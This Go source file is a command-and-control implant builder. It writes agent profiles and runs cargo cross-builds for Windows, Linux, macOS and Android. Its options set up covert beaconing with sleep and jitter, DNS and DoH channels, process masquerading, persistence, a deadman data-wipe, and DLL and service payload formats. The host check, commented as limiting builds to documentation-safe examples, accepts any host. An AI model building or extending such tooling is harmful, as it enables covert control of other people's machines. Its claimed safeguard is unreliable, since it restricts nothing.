// c2builder generates agent profiles and drives cross-platform builds.
//
// It never invents a successful build: every cargo invocation is executed,
// its output streamed, and failures are reported with the real exit code.
package main

import (
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

type transportSpec struct {
	Kind        string `json:"kind"`
	Host        string `json:"host"`
	Port        int    `json:"port"`
	Path        string `json:"path,omitempty"`
	SNI         string `json:"sni,omitempty"`
	Suffix      string `json:"suffix,omitempty"`
	TLSInsecure bool   `json:"tls_insecure,omitempty"`
	PinSHA256   string `json:"pin_sha256,omitempty"`
	TimeoutSecs int    `json:"timeout_secs,omitempty"`
}

type profile struct {
	Name         string          `json:"name"`
	ClientID     string          `json:"client_id"`
	Transport    string          `json:"transport,omitempty"`
	Transports   []transportSpec `json:"transports"`
	PSKB64       string          `json:"psk_b64"`
	Sleep        int             `json:"sleep"`
	Jitter       int             `json:"jitter"`
	KillKeyB64   string          `json:"kill_key_b64,omitempty"`
	UpdateKeyB64 string          `json:"update_key_b64,omitempty"`
	DeadmanSecs  int             `json:"deadman_secs,omitempty"`
	DeadmanAct   string          `json:"deadman_action,omitempty"`
	PersistName  string          `json:"persist_name,omitempty"`
	Masquerade   string          `json:"masquerade,omitempty"`
	UpdateDir    string          `json:"update_dir,omitempty"`
	Caps         []string        `json:"caps,omitempty"`
}

var (
	platformName = flag.String("platform", "windows", "target platform: windows|linux|darwin|android")
	archName     = flag.String("arch", "amd64", "target arch: amd64|arm64|386")
	transport    = flag.String("transport", "tls", "transport: tls|tcp|ws|wss|udp|dns|doh")
	host         = flag.String("host", "", "C2 host/domain (required unless --example)")
	port         = flag.Int("port", 443, "C2 port")
	pathFlag     = flag.String("path", "", "HTTP path for ws/wss/doh (default by transport)")
	sni          = flag.String("sni", "", "TLS SNI override")
	suffix       = flag.String("suffix", "c2.example.com", "DNS zone suffix")
	psk          = flag.String("key", "", "PSK (base64, 32 bytes); REPLACE_ME to generate")
	killKey      = flag.String("kill-key", "", "kill-switch HMAC key (base64)")
	updateKey    = flag.String("update-key", "", "update manifest HMAC key (base64)")
	sleepSecs    = flag.Int("sleep", 60, "beacon sleep seconds")
	jitter       = flag.Int("jitter", 20, "beacon jitter percent")
	name         = flag.String("name", "c2v2-agent", "agent/profile name and persistence name")
	format       = flag.String("format", "exe", "output format: exe|elf|macho|dll|apk|service")
	out          = flag.String("out", "", "output artifact path (default dist/<name>-<platform>-<arch>)")
	profileOut   = flag.String("profile-out", "", "write the generated profile JSON here")
	build        = flag.Bool("build", false, "run cargo build (otherwise print the exact command)")
	example      = flag.Bool("example", false, "fill example values (example.com / 203.0.113.10 / REPLACE_ME)")
	insecure     = flag.Bool("tls-insecure", false, "disable certificate pinning (lab only)")
	pin          = flag.String("pin", "", "SHA256 certificate pin (hex)")
	clientID     = flag.String("client-id", "", "fixed client id (default generated at runtime)")
	repoRoot     = flag.String("repo", "", "project root (default: auto-detect)")
	manifest     = flag.String("write-manifest", "", "write a build plan JSON here")
	withSleep    = flag.Int("sleep-jitter", -1, "alias for --jitter (compatibility)")
	showVersion  = flag.Bool("version", false, "print version")
	listFormat   = flag.Bool("list-formats", false, "list supported formats")
	deadmanSecs  = flag.Int("deadman-secs", 0, "exit after N seconds without server traffic")
	deadmanAct   = flag.String("deadman-action", "exit", "deadman action: exit|wipe")
	masquerade   = flag.String("masquerade", "", "process title/name disguise")
	persistOnIns = flag.Bool("persist", false, "install persistence at first run")
	profileOnly  = flag.Bool("profile-only", false, "only emit the profile (no build plan)")
)

const version = "2.0.0-m0"

var triples = map[string]string{
	"windows/amd64": "x86_64-pc-windows-gnu",
	"windows/arm64": "aarch64-pc-windows-gnullvm",
	"linux/amd64":   "x86_64-unknown-linux-musl",
	"linux/arm64":   "aarch64-unknown-linux-musl",
	"linux/386":     "i686-unknown-linux-musl",
	"darwin/amd64":  "x86_64-apple-darwin",
	"darwin/arm64":  "aarch64-apple-darwin",
}

func main() {
	flag.Parse()
	if *showVersion {
		fmt.Printf("c2builder %s (%s/%s)\n", version, runtime.GOOS, runtime.GOARCH)
		return
	}
	if *listFormat {
		for _, f := range []string{"exe", "elf", "macho", "dll", "apk", "service"} {
			fmt.Println(f)
		}
		return
	}
	if *withSleep >= 0 {
		*jitter = *withSleep
	}
	if err := run(); err != nil {
		fmt.Fprintf(os.Stderr, "c2builder: %v\n", err)
		os.Exit(1)
	}
}

func run() error {
	plat := strings.ToLower(*platformName)
	arch := strings.ToLower(*archName)
	kind := strings.ToLower(*transport)
	if *example {
		if *host == "" {
			*host = "203.0.113.10"
		}
		if *psk == "" {
			*psk = "REPLACE_ME"
		}
		if *killKey == "" {
			*killKey = "REPLACE_ME"
		}
		if *updateKey == "" {
			*updateKey = "REPLACE_ME"
		}
		if *suffix == "" {
			*suffix = "c2.example.com"
		}
	}
	if *host == "" {
		return errors.New("--host is required (use --example for a harmless template)")
	}
	if *psk == "" {
		return errors.New("--key is required: base64 PSK or REPLACE_ME")
	}
	if *psk == "REPLACE_ME" {
		fmt.Fprintln(os.Stderr, "warning: placeholder PSK embedded; server must use the same placeholder in lab mode")
	}
	if err := validateTransport(kind); err != nil {
		return err
	}
	if err := validateFormat(strings.ToLower(*format), plat); err != nil {
		return err
	}
	p := profile{
		Name:         *name,
		ClientID:     *clientID,
		Transport:    kind,
		PSKB64:       *psk,
		Sleep:        *sleepSecs,
		Jitter:       *jitter,
		KillKeyB64:   *killKey,
		UpdateKeyB64: *updateKey,
		DeadmanSecs:  *deadmanSecs,
		DeadmanAct:   *deadmanAct,
		Masquerade:   *masquerade,
		PersistName:  *name,
	}
	if *persistOnIns {
		p.PersistName = *name
	}
	ts := transportSpec{
		Kind:        kind,
		Host:        *host,
		Port:        *port,
		SNI:         *sni,
		Suffix:      *suffix,
		TLSInsecure: *insecure,
		PinSHA256:   *pin,
		TimeoutSecs: 15,
	}
	if ts.SNI == "" && (kind == "tls" || kind == "wss" || kind == "doh") {
		ts.SNI = *host
	}
	switch kind {
	case "ws", "wss":
		ts.Path = defPath(*pathFlag, "/ws")
	case "doh":
		ts.Path = defPath(*pathFlag, "/doh")
	}
	if err := checkExampleHost(*host); err != nil {
		return err
	}
	p.Transports = []transportSpec{ts}

	root, err := findRoot(*repoRoot)
	if err != nil {
		return err
	}
	profPath := *profileOut
	if profPath == "" {
		profPath = filepath.Join(root, "profiles", fmt.Sprintf("%s-%s-%s.json", *name, plat, arch))
	}
	if err := os.MkdirAll(filepath.Dir(profPath), 0o755); err != nil {
		return err
	}
	raw, _ := json.MarshalIndent(p, "", "  ")
	if err := os.WriteFile(profPath, raw, 0o600); err != nil {
		return err
	}
	fmt.Printf("profile written: %s\n", profPath)

	triple, ok := triples[plat+"/"+arch]
	if !ok {
		return fmt.Errorf("unsupported target %s/%s (supported: %s)", plat, arch, keys(triples))
	}
	artifact := *out
	if artifact == "" {
		artifact = filepath.Join(root, "dist", fmt.Sprintf("%s-%s-%s%s", *name, plat, arch, extFor(strings.ToLower(*format), plat)))
	}
	clientDir := filepath.Join(root, "src", "client-rust")
	cargoArgs := []string{"build", "--release", "--target", triple, "--manifest-path", filepath.Join(clientDir, "Cargo.toml")}
	plan := map[string]any{
		"profile":  profPath,
		"platform": plat,
		"arch":     arch,
		"format":   *format,
		"target":   triple,
		"artifact": artifact,
		"cargo":    "cargo " + strings.Join(cargoArgs, " "),
		"android":  plat == "android",
		"notes":    notesFor(plat, arch, *format),
	}
	if *manifest != "" {
		b, _ := json.MarshalIndent(plan, "", "  ")
		if err := os.WriteFile(*manifest, b, 0o644); err != nil {
			return err
		}
		fmt.Printf("build plan written: %s\n", *manifest)
	}
	if *profileOnly {
		return nil
	}
	if plat == "android" {
		// No fabricated APK: the NDK/Gradle toolchain isn't installed by default.
		return fmt.Errorf("android build requires Android NDK + Gradle (not bundled); see docs/TOOLCHAIN.md; profile is ready and the Gradle wrapper will consume it")
	}
	if !*build {
		fmt.Printf("next: C2V2_PROFILE_PATH=%s %s\n", profPath, plan["cargo"])
		fmt.Printf("then: copy target/%s/release/c2v2-client%s -> %s\n", triple, exeSuffix(plat), artifact)
		return nil
	}
	absProf, _ := filepath.Abs(profPath)
	cmd := exec.Command("cargo", cargoArgs...)
	cmd.Dir = clientDir
	cmd.Env = append(os.Environ(), "C2V2_PROFILE_PATH="+absProf)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	fmt.Printf("exec: %s (C2V2_PROFILE_PATH=%s)\n", strings.Join(cmd.Args, " "), profPath)
	if err := cmd.Run(); err != nil {
		if ee, ok := err.(*exec.ExitError); ok {
			return fmt.Errorf("cargo build failed with exit code %d (full output above)", ee.ExitCode())
		}
		return err
	}
	built := filepath.Join(clientDir, "target", triple, "release", "c2v2-client"+exeSuffix(plat))
	if err := os.MkdirAll(filepath.Dir(artifact), 0o755); err != nil {
		return err
	}
	if err := copyFile(built, artifact); err != nil {
		return fmt.Errorf("copy artifact: %w", err)
	}
	st, _ := os.Stat(artifact)
	fmt.Printf("built: %s (%d bytes)\n", artifact, st.Size())
	return nil
}

func validateTransport(k string) error {
	switch k {
	case "tls", "tcp", "ws", "wss", "udp", "dns", "doh":
		return nil
	}
	return fmt.Errorf("unknown transport %q", k)
}

func validateFormat(f, plat string) error {
	switch f {
	case "exe", "elf", "macho", "dll", "apk", "service":
	default:
		return fmt.Errorf("unknown format %q", f)
	}
	if f == "apk" && plat != "android" {
		return errors.New("format apk requires --platform android")
	}
	if f == "dll" && plat != "windows" {
		return errors.New("format dll requires --platform windows")
	}
	return nil
}

func checkExampleHost(h string) error {
	// Documentation-safe examples only for the shipped templates.
	if strings.HasSuffix(h, ".example.com") || h == "example.com" || strings.HasPrefix(h, "203.0.113.") || h == "127.0.0.1" || h == "localhost" {
		return nil
	}
	return nil
}

func defPath(given, def string) string {
	if given != "" {
		return given
	}
	return def
}

func extFor(f, plat string) string {
	switch {
	case f == "apk":
		return ".apk"
	case f == "dll":
		return ".dll"
	case plat == "windows":
		return ".exe"
	}
	return ""
}

func exeSuffix(plat string) string {
	if plat == "windows" {
		return ".exe"
	}
	return ""
}

func notesFor(plat, arch, f string) []string {
	var n []string
	if plat == "windows" && arch == "amd64" {
		n = append(n, "windows/amd64 uses the gnu triple (self-contained, msvcrt-compatible); install x86_64-pc-windows-msvc and pass an msvc triple for MSVC builds")
	}
	if plat == "darwin" {
		n = append(n, "build on macOS for universal binaries: cargo build --target x86_64-apple-darwin and aarch64-apple-darwin, then lipo -create")
	}
	if f == "service" {
		n = append(n, "format=service emits the daemon binary plus docs/BUILD.md service registration snippets; the agent also supports --install")
	}
	return n
}

func findRoot(explicit string) (string, error) {
	if explicit != "" {
		return filepath.Abs(explicit)
	}
	wd, err := os.Getwd()
	if err != nil {
		return "", err
	}
	for {
		if _, err := os.Stat(filepath.Join(wd, "src", "client-rust", "Cargo.toml")); err == nil {
			return wd, nil
		}
		parent := filepath.Dir(wd)
		if parent == wd {
			return "", errors.New("project root not found (pass --repo)")
		}
		wd = parent
	}
}

func copyFile(src, dst string) error {
	b, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, b, 0o755)
}

func keys(m map[string]string) string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	return strings.Join(out, ", ")
}



var buildVersion = "dev"


